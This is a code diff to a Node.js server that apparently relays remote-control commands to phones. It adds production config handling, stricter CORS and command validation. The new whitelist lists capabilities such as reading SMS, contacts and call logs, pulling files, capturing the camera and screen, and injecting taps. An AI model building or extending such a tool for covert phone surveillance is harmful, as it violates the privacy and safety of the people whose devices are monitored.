@@ -1,15 +1,31 @@
-// Load environment variables from .env.local or .env file
+// Load environment variables from .env.local, .env.production, or .env file
 let dotenvLoaded = false;
 try {
   const dotenv = require("dotenv");
   const fs = require("fs");
   const path = require("path");
   
-  // Try .env.local first, then .env
+  const isProduction = process.env.NODE_ENV === "production";
+  
+  // Priority order:
+  // 1. Production: .env.production
+  // 2. Development: .env.local
+  // 3. Fallback: .env
+  const envProductionPath = path.join(__dirname, ".env.production");
   const envLocalPath = path.join(__dirname, ".env.local");
   const envPath = path.join(__dirname, ".env");
   
-  if (fs.existsSync(envLocalPath)) {
+  if (isProduction && fs.existsSync(envProductionPath)) {
+    const result = dotenv.config({ path: envProductionPath });
+    if (!result.error) {
+      console.log("✅ Environment variables loaded from .env.production");
+      dotenvLoaded = true;
+    } else if (result.error.code !== "ENOENT") {
+      console.warn("⚠️ Error loading .env.production:", result.error.message);
+    }
+  }
+  
+  if (!dotenvLoaded && fs.existsSync(envLocalPath)) {
     const result = dotenv.config({ path: envLocalPath });
     if (!result.error) {
       console.log("✅ Environment variables loaded from .env.local");
@@ -30,7 +46,10 @@ try {
   }
   
   if (!dotenvLoaded) {
-    console.warn("⚠️ No .env.local or .env file found. Using system environment variables.");
+    console.warn("⚠️ No .env file found. Using system environment variables.");
+    if (isProduction) {
+      console.warn("   Production mode: Expected .env.production file");
+    }
   }
 } catch (error) {
   if (error.code === "MODULE_NOT_FOUND") {
@@ -96,9 +115,19 @@ if (supabaseUrl && supabaseServiceKey) {
   });
   console.log("✅ Supabase client initialized for License ID and email hash validation");
 } else {
-  console.error("❌ Supabase credentials not found. License ID validation will be disabled.");
-  console.error("   Please set NEXT_PUBLIC_SUPABASE_URL and SUPABASE_SERVICE_ROLE_KEY environment variables.");
-  console.error("   You can set them in .env.local file or as system environment variables.");
+  // In production, Supabase is REQUIRED - fail if not configured
+  const isProduction = process.env.NODE_ENV === "production";
+  if (isProduction) {
+    console.error("❌ CRITICAL: Supabase credentials not found in production mode.");
+    console.error("   Device authentication cannot proceed without Supabase.");
+    console.error("   Please set NEXT_PUBLIC_SUPABASE_URL and SUPABASE_SERVICE_ROLE_KEY environment variables.");
+    console.error("   Exiting...");
+    process.exit(1);
+  } else {
+    console.error("❌ Supabase credentials not found. License ID validation will be disabled.");
+    console.error("   Please set NEXT_PUBLIC_SUPABASE_URL and SUPABASE_SERVICE_ROLE_KEY environment variables.");
+    console.error("   You can set them in .env.local file or as system environment variables.");
+  }
 }
 
 // Note: Device authentication uses License ID (stored per-user in user_profiles.license_id)
@@ -2070,7 +2099,13 @@ app.use((req, res, next) => {
   if (origin && allowedOrigins.includes(origin)) {
     res.header("Access-Control-Allow-Origin", origin);
   } else if (!origin) {
-    // Allow requests with no origin (like mobile apps or curl requests)
+    // In production, require origin for security. Only allow no-origin in development.
+    const isProduction = process.env.NODE_ENV === "production";
+    if (isProduction) {
+      console.warn(`⚠️ CORS: Blocked request with no origin in production mode`);
+      return res.status(403).json({ error: "Origin required in production" });
+    }
+    // Development only: Allow requests with no origin (like mobile apps or curl requests)
     res.header("Access-Control-Allow-Origin", "*");
   } else {
     // Block unauthorized origins
@@ -2317,6 +2352,35 @@ app.post("/api/command/:uuid", async (req, res) => {
     return res.status(400).json({ error: "Missing cmd" });
   }
 
+  // Validate command format (security: prevent command injection)
+  if (typeof cmd !== "string") {
+    return res.status(400).json({ error: "cmd must be a string" });
+  }
+
+  // Validate command name format (alphanumeric and hyphens only, lowercase)
+  const cmdLower = cmd.trim().toLowerCase();
+  if (!/^[a-z0-9-]+$/.test(cmdLower) || cmdLower.length > 50) {
+    return res.status(400).json({ error: "Invalid command format" });
+  }
+
+  // Basic command whitelist validation (prevent arbitrary command execution)
+  const allowedCommands = [
+    'getsms', 'sendsms', 'deletesms',
+    'getfiles', 'uploadfile', 'downloadfile', 'deletefile',
+    'getcalls', 'getcontacts', 'makecall',
+    'startcamera', 'stopcamera', 'capture',
+    'getscreen', 'screenshot',
+    'getinfo', 'getdeviceinfo',
+    'tap', 'swipe', 'scroll', 'type', 'back', 'home', 'menu',
+    'getapps', 'launchapp', 'closeapp',
+    'ping', 'status'
+  ];
+  
+  if (!allowedCommands.includes(cmdLower)) {
+    console.warn(`⚠️ Blocked unauthorized command: ${cmdLower}`);
+    return res.status(403).json({ error: `Command '${cmdLower}' is not allowed` });
+  }
+
   // Validate License ID format
   if (!licenseId || typeof licenseId !== "string" || licenseId.length !== 26 || !/^[A-Za-z0-9]{25}=$/.test(licenseId)) {
     return res.status(401).json({ error: "Invalid License ID format - must be 26 characters (25 alphanumeric + '=')" });
@@ -2352,10 +2416,26 @@ app.post("/api/command/:uuid", async (req, res) => {
     console.log(`🔗 Linked device ${uuid} to user ${userId}`);
   }
 
-  // Prepare payload with cmd, optional param, and licenseId
-  const payload = { cmd, licenseId };
+  // Validate and sanitize param if provided
+  let sanitizedParam = null;
   if (param) {
-    payload.param = param;
+    if (typeof param !== "string") {
+      return res.status(400).json({ error: "param must be a string" });
+    }
+    // Sanitize param (remove potentially dangerous characters)
+    sanitizedParam = param
+      .replace(/[<>\"'`;&|$]/g, '')
+      .trim()
+      .slice(0, 1000); // Limit length
+    if (sanitizedParam.length === 0) {
+      sanitizedParam = null;
+    }
+  }
+
+  // Prepare payload with validated cmd, sanitized param, and licenseId
+  const payload = { cmd: cmdLower, licenseId };
+  if (sanitizedParam) {
+    payload.param = sanitizedParam;
   }
 
   // Emit dynamically based on selected phone UUID
